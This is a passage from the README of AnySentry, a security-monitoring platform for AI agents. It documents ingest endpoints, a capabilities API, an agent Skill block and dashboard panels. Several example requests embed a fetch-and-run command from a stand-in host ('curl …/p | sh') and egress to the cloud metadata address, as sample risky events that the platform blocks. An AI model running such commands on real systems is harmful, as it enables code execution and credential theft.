Collector heartbeat, and Source check-in still use Source identity and Source ingest tokens. The
dashboard also sends `X-AnySentry-Admin-Token` when the browser has
`localStorage["anysentry.adminToken"]` set; the console header's management-token control manages
that browser-local value, so the token is not built into the static web bundle.
Standalone verifier scripts that create or update management objects also forward
`ANYSENTRY_ADMIN_TOKEN` / `ANYSENTRY_MANAGEMENT_TOKEN` when set, while the management-auth verifier
keeps its explicit missing-token rejection checks.

## Ingest contract

AnySentry is fed by `POST /security-center/ingest`. The body is `{ "line": <raw a3s-observer
NDJSON> }`; identity, workspace, and session are derived from the line itself, so any producer in
any language can drive it. Producers may also include `collectorId`, `sourceId`, or
`X-AnySentry-Ingest-Token` / bearer auth to attach platform-side source identity:

```bash
curl -X POST localhost:29653/security-center/ingest -H 'Content-Type: application/json' -d '{
  "line": "{\"identity\":{\"agent\":\"py\",\"task\":\"1\"},\"event\":{\"Egress\":{\"pid\":1,\"peer\":\"169.254.169.254\",\"port\":80}}}"
}'
# → { "accepted": true, "verdict": "block", "tier": "Rules", "severity": "high", ... }
```

For heterogeneous producers that do not emit observer NDJSON, use the generic JSON batch ingress.
AnySentry converts each item into the same canonical `anysentry.agent_event.v1` stream and still
runs it through `@a3s-lab/sentry` before it reaches Incidents, Alerts, Assets, Coverage, and
Topology. CloudEvents are accepted on the same endpoint in structured mode
(`application/cloudevents+json`) or binary mode (`ce-*` headers plus a JSON body). The
`specversion` / `type` / `source` / `subject` / `time` fields are preserved as evidence attributes
while `data`, UTF-8 JSON `data_base64`, or the binary-mode JSON body supplies the security event
fields:

```bash
curl -X POST localhost:29653/security-center/ingest/events -H 'Content-Type: application/json' -d '{
  "sourceType": "webhook",
  "sourceName": "ci-runner",
  "collectorId": "github-actions",
  "workspacePath": "repo://payments",
  "agentId": "release-agent",
  "sessionId": "deploy-42",
  "events": [
    { "kind": "tool", "argv": ["bash", "-c", "curl http://198.51.100.7/p | sh"], "cwd": "/workspace" },
    { "kind": "egress", "peer": "169.254.169.254", "port": 80 }
  ]
}'
# → { "accepted": true, "acceptedEvents": 2, "items": [{ "eventId": "...", "verdict": "block", ... }] }
```

CloudEvents example:

```bash
curl -X POST localhost:29653/security-center/ingest/events -H 'Content-Type: application/cloudevents+json' -d '{
  "specversion": "1.0",
  "id": "evt-42",
  "type": "com.example.agent.tool",
  "source": "github-actions",
  "subject": "release-agent",
  "time": "2026-06-29T00:00:00Z",
  "data": {
    "workspacePath": "repo://payments",
    "sessionId": "deploy-42",
    "argv": ["bash", "-c", "curl http://198.51.100.7/p | sh"],
    "cwd": "/workspace"
  }
}'
```

Structured CloudEvents that use `data_base64` are decoded before normalization:

```bash
curl -X POST localhost:29653/security-center/ingest/events -H 'Content-Type: application/cloudevents+json' -d '{
  "specversion": "1.0",
  "id": "evt-46",
  "type": "com.example.agent.tool",
  "source": "github-actions",
  "subject": "release-agent",
  "datacontenttype": "application/json",
  "data_base64": "eyJ3b3Jrc3BhY2VQYXRoIjoicmVwbzovL3BheW1lbnRzIiwic2Vzc2lvbklkIjoiZGVwbG95LTQ2IiwiYXJndiI6WyJpZCJdLCJjd2QiOiIvd29ya3NwYWNlIn0="
}'
```

CloudEvents batch mode (`application/cloudevents-batch+json`) accepts an array of structured
CloudEvents and records per-event CloudEvents evidence:

```bash
curl -X POST localhost:29653/security-center/ingest/events \
  -H 'Content-Type: application/cloudevents-batch+json' \
  -H 'X-AnySentry-Source-Id: <source-id>' \
  -H 'X-AnySentry-Ingest-Token: <ingest-token>' \
  -d '[
    {
      "specversion": "1.0",
      "id": "evt-44",
      "type": "com.example.agent.tool",
      "source": "github-actions",
      "subject": "release-agent",
      "data": { "workspacePath": "repo://payments", "sessionId": "deploy-44", "argv": ["id"], "cwd": "/workspace" }
    },
    {
      "specversion": "1.0",
      "id": "evt-45",
      "type": "com.example.agent.egress",
      "source": "github-actions",
      "subject": "release-agent",
      "data": { "workspacePath": "repo://payments", "sessionId": "deploy-44", "peer": "169.254.169.254", "port": 80 }
    }
  ]'
```

CloudEvents binary-mode example:

```bash
curl -X POST localhost:29653/security-center/ingest/events \
  -H 'Content-Type: application/json' \
  -H 'ce-specversion: 1.0' \
  -H 'ce-id: evt-43' \
  -H 'ce-type: com.example.agent.egress' \
  -H 'ce-source: github-actions' \
  -H 'ce-subject: release-agent' \
  -H 'ce-datacontenttype: application/json' \
  -d '{
    "workspacePath": "repo://payments",
    "sessionId": "deploy-43",
    "peer": "169.254.169.254",
    "port": 80
  }'
```

OpenTelemetry bridges can send OTLP/HTTP JSON directly to
`POST /security-center/ingest/otlp/v1/logs` or
`POST /security-center/ingest/otlp/v1/traces` (the shorter
`POST /security-center/ingest/otel` accepts both signals too). AnySentry accepts `resourceLogs` and
`resourceSpans`, maps resource attributes such as `service.name`, `service.namespace`,
`service.instance.id`, and `k8s.pod.name` onto Agent / Workspace / Session identity, and maps common
span/log attributes into tool, network, file, LLM, or content events:

```bash
curl -X POST localhost:29653/security-center/ingest/otlp/v1/logs -H 'Content-Type: application/json' -d '{
  "sourceType": "otel",
  "resourceLogs": [{
    "resource": { "attributes": [
      { "key": "service.name", "value": { "stringValue": "release-agent" } },
      { "key": "service.namespace", "value": { "stringValue": "repo://payments" } }
    ] },
    "scopeLogs": [{ "logRecords": [{
      "traceId": "4bf92f3577b34da6a3ce929d0e0e4736",
      "spanId": "00f067aa0ba902b7",
      "body": { "stringValue": "bash -c curl http://198.51.100.7/p | sh" },
      "attributes": [
        { "key": "anysentry.event.kind", "value": { "stringValue": "tool" } },
        { "key": "process.command_line", "value": { "stringValue": "bash -c curl http://198.51.100.7/p | sh" } }
      ]
    }] }]
  }]
}'
```

To regression-check the heterogeneous ingress contract against a running API, including evidence
redaction across generic JSON, CloudEvents, and OTLP attributes, use:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:ingest-protocols
```

For a one-command local run that builds the API, starts a temporary server, verifies Generic JSON,
CloudEvents structured/binary/batch, CloudEvents `data_base64`, OTLP logs/traces plus the mixed
short `/ingest/otel` endpoint, Source token rejection, and Source rollups, then stops the server:

```bash
pnpm verify:ingest-protocols:local
```

## Source-compatible progressive capability API

AnySentry exposes a source-compatible progressive API at `GET|POST /security-center/capabilities`.
It follows the same compact discovery pattern as the platform capabilities API:
`list -> search / describe -> execute`. Callers discover modules first, search or describe the
exact operation schema only when needed, then call a single `execute` action with
`module + operation + params`. `describe` can narrow all the way to one operation.
Operation descriptions include typed `inputSchema.body.properties.params` contracts
and structured `outputSchema.data` result schemas, so agents can generate calls
without a second OpenAPI surface or duplicated reference docs.
For `execute` calls, `dryRun: true` uses the same described input schema to return
`anysentry.progressive.dry_run.v1` with `schemaValid`, `schemaIssues`, and a
normalized request preview without writing events or mutating remediation state.
The dashboard includes the same flow at `/capabilities` for live discovery and request replay.

```bash
curl 'http://localhost:29653/security-center/capabilities?action=list'
curl 'http://localhost:29653/security-center/capabilities?action=describe&module=security-center&operation=assessRuntimeAction'
```

The built-in module is `security-center`, with these operations:

- `assessRuntimeAction` - evaluate one AI runtime action and return
  `allow`, `warn`, `require_approval`, or `block`.
- `recordSecurityEvents` - normalize custom/webhook/OTel-shaped evidence into
  the same judged event stream as observer NDJSON.
- `buildEvidenceBundle` - assemble governance evidence around an event,
  run, trace, source, incident, objective, or scope.
- `planNextActions` - rank active remediation, incident, alert, objective, and
  coverage-derived work into an evidence-linked action plan for AI operators.

Runtime guard calls use loop-autonomy vocabulary in `params.autonomy` or `constraints.autonomy`:
`suggest` only warns, `guarded` returns `require_approval` for block-level risk, and `auto`
returns a blocking decision.
Use the same POST body with `dryRun: true` before execution when an agent needs a
side-effect-free schema and targeting preflight.

```bash
curl -X POST http://localhost:29653/security-center/capabilities \
  -H 'Content-Type: application/json' \
  -d '{
    "action": "execute",
    "module": "security-center",
    "operation": "assessRuntimeAction",
    "params": {
      "autonomy": "guarded",
      "stage": "tool",
      "workspacePath": "repo://payments",
      "agentId": "release-agent",
      "sessionId": "deploy-42",
      "toolName": "bash",
      "command": ["bash", "-c", "curl http://198.51.100.7/p | sh"]
    }
  }'
```

AI operators can then ask for a structured next-action plan and use each action's
`evidence.bundleHint` with `buildEvidenceBundle` when a deeper case file is needed:

```bash
curl -X POST http://localhost:29653/security-center/capabilities \
  -H 'Content-Type: application/json' \
  -d '{
    "action": "execute",
    "module": "security-center",
    "operation": "planNextActions",
    "params": {
      "timeType": "last_1d",
      "workspacePath": "repo://payments",
      "maxActions": 5
    }
  }'
```

By default this endpoint follows the raw progressive dispatch contract: `list` returns modules, `search`
returns operations, `describe` returns a module or operation, and `execute` returns the operation
result. Add `shaped=true` to get a tool-friendly envelope with `success`, `modules` / `operations` /
`operation` / `data`, plus compatibility metadata. Legacy `capabilityId` inputs such as
`security.runtimeGuard` are still accepted as aliases, but they are not the primary protocol.

## Coding-agent progressive API Skill

The repo ships an `a3s-box`-style Skill for coding agents at
[`integrations/skills/anysentry-api`](integrations/skills/anysentry-api).
It gives Codex, Claude Code, Cursor/Windsurf, Devin/OpenHands, a3s-code, or any other coding agent
the same progressive API contract: **discover first, describe exactly, then execute**. Agents should
use this Skill instead of memorizing concrete REST paths or falling back to the deprecated ACP-style
`poll` / `subscribe` / `approve` action set.

### Canonical Skill artifact

The canonical artifact is the directory under `integrations/skills/`. Install or package the whole
directory when the host supports filesystem Skills; otherwise paste the `SKILL.md` body into that
host's project/system instructions.

```bash
mkdir -p "${CODEX_HOME:-$HOME/.codex}/skills"
cp -R integrations/skills/anysentry-api "${CODEX_HOME:-$HOME/.codex}/skills/"
```

Then invoke it explicitly:

```text
Use $anysentry-api to check http://localhost:29653/security-center and assess this planned shell command before execution.
```

### Universal agent instruction block

For agent hosts that do not have a native Skill package format, add this block to the agent's
system prompt, project rules, or repository instructions:

```markdown
---
name: anysentry-api
description: "Use AnySentry's progressive API to deploy-check AnySentry, discover security-center operations, assess runtime actions, ingest evidence, and build evidence bundles."
parameters:
  - name: apiBase
    type: string
    required: false
    description: "AnySentry API base without a trailing slash, default http://127.0.0.1:29653/security-center"
  - name: action
    type: string
    required: true
    description: "list | search | describe | execute"
  - name: module
    type: string
    required: false
    description: "Module name, normally security-center"
  - name: operation
    type: string
    required: false
    description: "Operation from describe, such as assessRuntimeAction"
  - name: params
    type: object
    required: false
    description: "Operation parameters validated against describe"
---

# AnySentry Progressive API Skill

Use this Skill only when a running AnySentry API is available. Set
`ANYSENTRY_API_BASE` to the API root without a trailing slash; default to
`http://127.0.0.1:29653/security-center`.

Flow:

1. Health check: `GET $ANYSENTRY_API_BASE/healthz`.
2. Discover: `GET $ANYSENTRY_API_BASE/capabilities?action=list`.
3. Search when unsure: `GET $ANYSENTRY_API_BASE/capabilities?action=search&query=<keywords>`.
4. Describe before execution:
   `GET $ANYSENTRY_API_BASE/capabilities?action=describe&module=security-center&operation=<operation>`.
5. Execute only with `POST $ANYSENTRY_API_BASE/capabilities` and JSON body:
   `{ "action": "execute", "module": "security-center", "operation": "<operation>", "params": { ... } }`.

Rules:

- Do not guess module names, operation names, parameters, enum values, or response shape. Use
  `list`, `search`, and `describe` first.
- Do not use ACP-only actions `poll`, `subscribe`, or `approve`; AnySentry's primary protocol is
  `list / search / describe / execute`.
- Prefer `dryRun: true` before enforcing a guard decision on a planned tool command.
- Use `params.autonomy` or `constraints.autonomy` with autonomy modes: `suggest`, `guarded`, or
  `auto`.
- Treat guard results as policy signals: `allow` may proceed, `warn` should be surfaced,
  `require_approval` needs human approval, and `block` must stop the action.
- Use `recordSecurityEvents` for structured agent evidence and `buildEvidenceBundle` for handoff
  reports after you have an `eventId`, `runId`, `traceId`, source, incident, objective, or scope.
- If management auth is enabled, pass `X-AnySentry-Admin-Token` only for control-plane writes.
  Ingest identity uses Source tokens, not the admin token.
- When a request fails, re-run `describe` for the target module/operation before changing fields.
```

### Host adapters

| Agent host | How to attach the Skill |
|---|---|
| Codex / OpenAI coding agents | Copy `integrations/skills/anysentry-api` into `${CODEX_HOME:-$HOME/.codex}/skills/`, then call `Use $anysentry-api ...`. |
| a3s-code / platform runtimes | Attach the parent directory with `skillDirs: ["integrations/skills"]`, then invoke `Skill` with `skill_name: "anysentry-api"`. Use `pnpm verify:a3s-code-skill-api` for the real SDK/model check. |
| Claude Code | Put the universal block or the canonical `SKILL.md` content in `CLAUDE.md` or project instructions. Use the shell/HTTP tools only when the session allows them. |
| Cursor / Windsurf | Add the universal block to workspace rules (for example `.cursor/rules/anysentry-api.mdc`) or global AI rules, and set `ANYSENTRY_API_BASE` in the dev environment. |
| Devin / OpenHands / remote coding agents | Add the block to repository instructions or the task bootstrap prompt, export `ANYSENTRY_API_BASE`, and run the verifier commands after integration. |
| Generic SDK agents | Store the block as a system instruction and implement four helper calls: `listCapabilities`, `searchCapabilities`, `describeOperation`, and `executeOperation`. Keep endpoint construction centralized so models never hand-write stale URLs. |

### Minimal helper contract

Any host can implement the Skill with this small tool surface:

```ts
type ProgressiveAction = "list" | "search" | "describe" | "execute";

interface AnySentryProgressiveCall {
  action: ProgressiveAction;
  module?: "security-center" | string;
  operation?: string;
  query?: string;
  params?: Record<string, unknown>;
  dryRun?: boolean;
  shaped?: boolean;
}
```

Discovery uses `GET /capabilities`; execution uses `POST /capabilities`. The service owns the
operation schemas, so the agent should cache described schemas within a session but refresh them
after an error or deployment change.

## What it shows

The backend holds one `Sentry` judge. Each ingested event is run through `sentry.evaluate()`, the
resulting `Decision { verdict, tier, severity, reason, action, risk }` is recorded to ClickHouse,
and an in-memory hot ring (hydrated from ClickHouse on boot) serves the panels. Risk taxonomy comes
from `a3s-sentry`; AnySentry only localizes, aggregates, and displays it. Every panel is a query over
that live decision stream:

| Panel | Source |
|---|---|
| Health / token | block & escalate rates over the window |
| Explainability wave | safe-vs-risk score binned over time |
| Decision funnel | events resolved at L1 rules → L2 (escalations) → L3 (high/critical) → final block |
| Risk summary / breakdown | judged events grouped by the monitored risk taxonomy, with period-over-period change |
| Collector health | a3s-observer heartbeats grouped by node / pod, with drop and coverage signals |
| Ingestion sources | platform-managed observer / forwarder / webhook / OTel / custom sources with token rotation, health, and last-seen state |
| Agent inventory | agents automatically discovered from observer events, with platform-side owner / environment / criticality metadata |
| Workspace inventory | service/workspace assets derived from Agent inventory, with owner, coverage, maintenance, and risk rollups |
| Coverage gaps | non-invasive monitoring completeness: stale agents, source gaps, stale Source tokens, missing collector heartbeat, and unowned events |
| Maintenance windows | platform-side planned maintenance for all / workspace / agent / collector / source targets, suppressing alert noise without agent changes |
| Agent topology | workspace / collector / tool / network / file / LLM dependencies inferred from observed events |
| Incident management | risky observer events auto-grouped into open / acknowledged / resolved incidents |
| Alert center | platform-side alerts from Incidents, Collector health, risky Agents, severe block events, rejected Source ingress, Source health, Coverage gaps, Objective breaches, and overdue Remediations |
| Notification routing | webhook channels, delivery history, and alert routes by severity, kind, workspace, agent, collector, source, owner, team, or keyword, including Coverage issue routes |
| Objectives / SLO | non-invasive monitoring goals for coverage, Incident, Alert, overdue-Remediation, risky-event, stale-Agent, Collector-down, and Source-down thresholds |
| Remediation center | Runbook tasks derived from Incidents, Alerts, Coverage gaps, and Source health issues, with owner/status/steps |
| AI Operator workbench | `/operator` ranks active work through `security-center.planNextActions`, previews evidence through progressive `buildEvidenceBundle`, updates Remediation status, and deep-links related assets |
| Progressive API workbench | `/capabilities` lets operators discover modules, search/describe operations, edit execute payloads, run schema-aware dry-run preflights, and inspect responses through the single capabilities endpoint |
| Audit log | platform management actions such as policy saves/replays, Incident, Alert, and Remediation updates |
| Non-invasive event timeline | recent canonical agent events with trace/span/run IDs and risk evidence |
| Policy replay | dry-run a draft policy against recent observed events before saving it |
| Highest-risk session | the session with the largest summed risk, as a 6-dimension radar |
| Workspace distribution | risk grouped by workspace / agent identity |
| Agent observability | live SSE: heartbeat, error rate, throughput, behavior drift |

`escalate` rules fail-open when no L2/L3 backend is wired, but the marker + severity are
preserved, so the monitoring layer still surfaces them as escalations — exactly what the funnel's
L2/L3 tiers count.

## Event APIs

In addition to the aggregate dashboard APIs, AnySentry exposes event evidence for drill-down:

- `POST /security-center/events/list` — recent canonical agent events, filterable by time,
  agent/session/workspace, trace/run, event kind/category, and verdict; `eventId` pins an exact
  evidence event even when the current filters would normally hide it. A request with only
  `eventId` returns just that evidence row.
- `POST /security-center/events/timeline` — ordered events for a trace, run, session, or pinned
  evidence `eventId`.
- `GET /security-center/sessions/agentObservability/stream` — live SSE frames for dashboard
  heartbeat, error-rate, throughput, latency, and behavior-drift metrics.
- `POST /security-center/evidence/bundle` — read-only case-file assembly for an `eventId`,
  Topology `edgeId`, `incidentId`, `alertId`, `taskId`, `objectiveId`, Coverage `issueId`, Notification `deliveryId`, Maintenance `windowId`, Audit `auditId`, or operational scope. The bundle links the
  primary object with timeline events, related Incidents, Alerts, Remediations, Objectives, Coverage
  gaps, Notification delivery history, Maintenance windows, Topology evidence, Agent / Workspace /
  Source / Collector context, and management
  Audit records without requiring any agent-side code. Source/Collector/Workspace scoped bundles
  include notification deliveries by exact alert context scope, so operational handoffs keep the
  delivery trail even without a specific Alert ID. Scoped bundles also include exact target
  Maintenance windows so handoffs retain the active suppression context without broad keyword
  matching; Source/Collector/Workspace scoped bundles also attach exact observed Agent maintenance
  windows from scoped event evidence. A pure `sourceId` bundle hydrates that Source's bound
  Collector and Workspace context so the handoff includes the upstream operational owner path,
  Collector-scoped bundles attach the Workspace inventory context for exact matching Sources plus
  exact observed Agent context from the scoped event evidence without workspace-wide Agent bleed,
  Workspace-scoped bundles attach Collector health context for exact matching Sources and the
  Workspace's Agent inventory, and a unique metadata-only `agentId` bundle hydrates that Agent's
  Workspace ownership context. Coverage `issueId` bundles hydrate the issue's exact Source,
  Collector, Workspace, and Maintenance context; Agent context is included only when the issue or
  scoped event evidence identifies that Agent. Objective and Remediation case files also preserve
  second-order links such as Objective-derived Remediation overdue Alerts and their delivery records.
- `POST /security-center/evidence/export` — redaction-safe Markdown handoff generation for the same
  Evidence Bundle selectors, returning filename, content hash, scope, summary, and export content for
  ticket, review, or incident handoff workflows.
- `POST /security-center/ingest/events` — generic JSON batch ingress for webhook, OTel bridge,
  or custom producers; items are normalized into the same canonical event stream as observer NDJSON.
- `POST /security-center/ingest/otel`, `/security-center/ingest/otlp/v1/logs`, and
  `/security-center/ingest/otlp/v1/traces` — native OTLP/HTTP JSON ingress for `resourceLogs` and
  `resourceSpans`, normalized into the same canonical event stream and source registry.
- `POST /security-center/incidents/list` and `PUT /security-center/incidents/:incidentId` —
  risk events automatically grouped into operational incidents that can be acknowledged,
  reopened, or resolved; list queries can be scoped by workspace, Agent, session, trace, Collector,
  or Source.
- `POST /security-center/alerts/list`, `PUT /security-center/alerts/:alertId`, and
  `GET /security-center/alerts/config` — operational alerts derived from Incidents, Collector
  heartbeats, Agent pressure, severe block events, rejected Source ingress attempts, Source
  check-in errors, stale/down Sources, Coverage gaps, stale Source tokens, Objective breaches, and
  overdue Remediation tasks. Alert list selectors include exact `alertId`, linked `incidentId`,
  `eventId`, Remediation `taskId`, Objective `objectiveId`, and Coverage `issueId`; related-ID
  selectors pin the target alert while still allowing filtered context rows for deep links.
  `ANYSENTRY_ALERT_WEBHOOK_URL` enables best-effort webhook notification without changing agents.
- `GET /security-center/notifications/config`, `POST/PUT /security-center/notifications/channels`,
  and `POST/PUT /security-center/notifications/routes` — platform-managed webhook channels and
  routing rules. Routes can match severity, alert kind, workspace, agent, collector, source, owner,
  team, or keyword. Generated Source alerts inherit Source owner/team, while Event, Incident, and
  Agent alerts inherit Agent metadata owner/team when available, then Source owner/team where
  applicable. Coverage alerts use matching Agent owner/team when scoped to an Agent and fall back to
  Source owner/team for Source-scoped gaps. Notification config includes a redaction-safe delivery
  log with alert, action (`opened`, `reopened`, or `resolved`), route, channel, status, duration,
  related Incident/Event/Remediation/Objective/Coverage issue IDs, and error context; exact `channelId`, `routeId`,
  `deliveryId`, `alertId`, `incidentId`, `eventId`, `taskId`, `objectiveId`, or `issueId` query parameters pin
  or filter notification rows for audit deep-links. Route-scope selectors also filter the Route
  list and Delivery Log by alert context, with exact workspace/agent/collector/source/owner/team
  matching and `minSeverity` as a delivery severity floor. Route lists can also be scoped by exact
  route selectors (`kind`, `minSeverity`, `workspacePath`, `agentId`, `collectorId`, `sourceId`,
  `owner`, or `team`) so Source/Collector/Agent/Workspace consoles open the matching notification
  policy context without keyword search. Failed deliveries emit system Audit records, and
  automatic Source / Objective / Coverage / Remediation recovery plus manual Alert / linked-Incident
  reopen/resolve actions emit matching lifecycle notifications. The legacy
  `ANYSENTRY_ALERT_WEBHOOK_URL` still works as a read-only fallback channel.
- `POST /security-center/objectives/list`, `POST /security-center/objectives`, and
  `PUT /security-center/objectives/:objectiveId` — platform-side monitoring goals for global,
  workspace, Agent, Collector, or Source targets. Objectives evaluate current coverage score, open
  Incidents, active Alerts, overdue Remediations, risky events, stale Agents, down Collectors, and
  unhealthy Sources from existing observed/control-plane data; no agent-side code or policy changes
  are required. Objective list selectors include exact `objectiveId` plus target `targetType`,
  `targetId`, and `metric` filters, so Source/Agent/Collector/Workspace consoles can deep-link into
  their matching goals without keyword search. Breached
  Objectives emit `objective.breach` Alerts that can route through Notifications and generate
  Remediation tasks, while Objective and Coverage governance alerts are excluded from
  `active_alerts` Objective calculations to avoid feedback loops. Targeted `coverage_score`
  Objectives use exact Coverage selectors (`workspacePath`, `agentId`, `collectorId`, or
  `sourceId`) before calculating the scoped score, avoiding keyword-search bleed between similarly
  named targets. Agent Objectives can use either a bare `agentId` or the composite
  `workspacePath:agentId` target ID; the Agent console uses the composite form so same-name Agents
  in different Workspaces do not bleed into Objective evaluation, breach Alerts, or Evidence
  Bundles.
- `POST /security-center/remediations/list` and `PUT /security-center/remediations/:taskId` —
  remediation/runbook tasks derived from Incidents, Alerts, Coverage gaps, and Source health issues,
  with owner, status, due time, notes, step completion state, and direct links back to Sources,
  Collectors, Agents, Alerts, or evidence events. Remediation list selectors include exact `taskId`,
  linked `incidentId`, `alertId`, `eventId`, Objective `objectiveId`, and Coverage `issueId`; related-ID
  selectors pin the target task while preserving source/workspace/agent/collector filter context.
  Active tasks past `dueAt` emit
  `remediation.overdue` Alerts for Notification routing via both task updates and a platform-side
  due-date scanner (`ANYSENTRY_REMEDIATION_OVERDUE_SCAN_SECS`, default 60 seconds); those meta-alerts
  are excluded from Remediation generation to avoid recursive tasks. Overdue Alerts inherit related
  Objective and Coverage issue IDs from the task so Notifications and Evidence Bundles keep the full
  governance context. Notification `deliveryId` Evidence Bundles use the delivery row as the primary
  evidence and hydrate the linked Alert, Incident/Event/Task/Objective/Coverage IDs, failed-delivery
  audit record, channel/route history, and scoped asset context without keyword search. Maintenance
  `windowId` Evidence Bundles use the window as primary evidence and hydrate target scope, related
  suppression context, and the Maintenance audit trail.
- `POST /security-center/audit/list` — platform management audit records for policy saves/replays,
  Incident updates, Alert updates, Objective updates, and Remediation updates. This is AnySentry
  control-plane data and does not require any agent-side instrumentation. Audit details carry
  structured resource identifiers so the UI can deep-link back to Agents, Sources, Notification
  channels/routes, failed delivery records, Objectives, Maintenance windows, Incidents, Alerts,
  Remediation tasks, or scoped Evidence Bundles. Audit `auditId` Evidence Bundles use the Audit
  record as primary evidence and hydrate linked resource context from exact resource/details IDs.
  Audit list selectors include exact `auditId` plus
  exact `resourceType` / `resourceId` and `actorId` filters; keyword search stays available through `q`.
- `POST /security-center/config/simulate` — dry-run a draft L1/L2/L3 policy against recent
  observed events and report added/removed blocks, escalations, affected Agents, and Workspaces.
- `GET /security-center/healthz` — deployment health/readiness JSON for probes and gateways,
  including service status, uptime, storage mode (`clickhouse` or in-memory), event counters, and
  active policy tier status. It intentionally stays `ok` when ClickHouse is unavailable because
  AnySentry can run in in-memory mode.
- `POST /security-center/agents/inventory` and `GET /security-center/agents/metadata` — agent
  assets discovered from the same observer event stream plus platform-side metadata-only Agent
  records, with metadata inventory readable for reconciliation; inventory queries are filterable by
  time, state, agent, workspace, and user.
- `PUT /security-center/agents/:agentId/metadata` — attach owner, team, environment, criticality,
  tags, and notes to a discovered Agent as a platform-side overlay; no agent code changes are
  required, and updates are written to the audit log. The Agent inventory view links each asset into
  Events, Topology, Incidents, Alerts, Coverage, Remediation, Maintenance, Objectives, and
  Notification routing; exact `agentId`/`workspacePath` deep links return only that Agent when used
  alone, or pin that Agent while preserving health/search context when filters are present,
  including metadata-only assets.
- `POST /security-center/workspaces/inventory` — workspace/service assets derived from observed
  Agents and platform metadata, with owner/team/environment rollups, maintenance state, collector
  count, risk, Incident, and activity metrics. The Workspace inventory view exposes the same
  operational jump points for the service domain; exact `workspacePath` links return only that
  Workspace when used alone, or pin that Workspace while preserving filtered context.
- `POST /security-center/agents/topology` — non-invasive dependency topology derived from the same
  event stream: workspace→agent, collector→agent, and agent→tool/network/file/LLM/security edges.
  Topology queries can be scoped by Agent, Workspace, Collector, Source, exact `edgeId`, or evidence
  `eventId`; exact selectors return only matching topology evidence when used alone, or pin the
  matching edge/event relationships while preserving filtered graph context. Topology `edgeId`
  Evidence Bundles use the edge as primary evidence and hydrate the sample event plus operational
  scope.
- `POST /security-center/collectors/health` — collector fleet health derived from
  `a3s-observer` `CollectorHeartbeat` control-plane events. The Collector health view links each
  collector into Events, Incidents, Alerts, Coverage, Remediation, Maintenance, Objectives, and
  Notification routing. Exact `collectorId` links are pinned even when state/node/search filters
  would normally hide the collector.
- `POST /security-center/collectors/heartbeat` — optional direct heartbeat endpoint for
  forwarders or DaemonSets that cannot emit heartbeat lines into the observer stream. The endpoint
  accepts optional Source identity/token fields or headers and updates Source heartbeat health using
  the same token enforcement and rejection alerts as normal ingest.
- `POST /security-center/sources/list`, `POST /security-center/sources`,
  `PUT /security-center/sources/:sourceId`, `POST /security-center/sources/:sourceId/rotate-token`,
  and `POST /security-center/sources/check-in` — platform-side ingestion source registry for
  observers, forwarders, webhooks, OTel bridges, and custom producers. Sources keep owner, team,
  workspace, collector binding, last attempt, last accepted signal, accepted/rejected counters,
  hashed ingest tokens, token issued/rotation due timestamps, and per-source token enforcement.
  `ANYSENTRY_SOURCE_TOKEN_ROTATION_DAYS` sets the default rotation period, and individual Sources
  can override it with `tokenRotationDays`. Source active/stale status is based on accepted events or
  heartbeats, so rejected attempts do not make a source look healthy; missing/invalid token attempts,
  malformed source events, check-in errors, stale tokens, and sources with no accepted signal beyond
  `ANYSENTRY_SOURCE_STALE_AFTER_SECS` / `ANYSENTRY_SOURCE_DOWN_AFTER_SECS` produce Source/Coverage
  signals. The Sources view can send a lightweight check-in or a judged test event, and links each
  source directly into Events, Incidents, Alerts, Coverage, Remediation, Maintenance, Objectives,
  and Notification routing. Exact `sourceId` links are pinned even when status/type filters would
  normally hide the source; exact `collectorId` and `workspacePath` filters scope Source inventory
  and Evidence Bundles without keyword search. Token use is optional for legacy producers, so
  existing no-agent-change ingest keeps working.
  Lightweight producers can also self-identify through check-in without sending a judged event:

  ```bash
  curl -X POST localhost:29653/security-center/sources/check-in \
    -H 'Content-Type: application/json' \
    -d '{
      "sourceName": "gha-otel-bridge",
      "sourceType": "otel",
      "workspacePath": "repo://payments",
      "status": "ok"
    }'
  ```
- `POST /security-center/coverage/overview` — monitoring coverage and blind-spot candidates
  derived from Source health, Source token rotation due state, Collector health, Agent activity,
  and event `collectorId` ownership. Medium-or-higher actionable issues also produce `coverage`
  Alerts for notification routing and resolve when the scoped Coverage issue disappears or is
  suppressed. Queries can be scoped exactly by `agentId`, `workspacePath`, `collectorId`,
  `sourceId`, or `issueId`.
- `POST /security-center/maintenance/list`, `POST /security-center/maintenance/windows`, and
  `PUT /security-center/maintenance/windows/:windowId` — planned maintenance windows for global,
  workspace, agent, collector, or source targets. Active windows suppress matching platform alerts and
  mark coverage issues as maintenance-suppressed without changing agents, observers, or sentry
  policy. Maintenance list selectors include exact `windowId` plus exact target `targetType` and
  `targetId`, so Source/Agent/Collector/Workspace consoles can deep-link into matching windows
  without keyword search.

These APIs are backed by the same non-invasive event stream that powers the dashboard.
Query-style POST endpoints return `200 OK`; ingest, creation, rotation, and update endpoints return
their action acknowledgements.
Operational read APIs accept their object IDs (`eventId`, Topology `edgeId`, `auditId`,
`incidentId`, `alertId`, Remediation `taskId`, Objective `objectiveId`, Notification `deliveryId`, Maintenance `windowId`, or
Coverage `issueId`) plus Alert/Remediation related IDs (`eventId`, `taskId`, `objectiveId`, and
`issueId`), Source `collectorId` / `workspacePath`, Audit `resourceType` / `resourceId` / `actorId`, and
Maintenance/Objective target selectors as pinned deep-link selectors, so Audit Log and cross-console links can surface filtered-out
operational objects without losing the normal list context. Event, Topology, Incident, Alert,
Remediation, Maintenance,
Objective, Audit, and Coverage requests with only the exact object ID return just that evidence or
operational row; adding other filters keeps the object pinned while showing the normal filtered
context.

To regression-check these cross-console semantics against a running API, use the HTTP verifier:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:deep-links
```

For a one-command local run, build the API, start a temporary AnySentry API on a free local port,
run the same verifier, and stop the temporary API afterward:

```bash
pnpm verify:deep-links:local
```

## Storage

Judged events are written to **ClickHouse** (a columnar TSDB — the right home for time-windowed
event analytics); the in-memory ring is just a hot read cache hydrated from it on boot, so date
windows survive restarts. If `CLICKHOUSE_URL` is unset, AnySentry runs in-memory only (no
durability). Retention is a 90-day `TTL` on the `events` table (tune in
`apps/api/src/security-monitoring/clickhouse-store.ts`). Policy, Agent metadata, Maintenance
windows, Notification channels/routes/delivery history, Objective state, Ingestion source state, Incident state,
Alert state, Remediation task state, Collector heartbeat ring, and platform audit records are stored
in the ClickHouse `config` table when ClickHouse is configured, so ownership, planned maintenance,
delivery routing/history, monitoring goals, source enrollment, status, step progress, and management
history survive restarts.

## Development

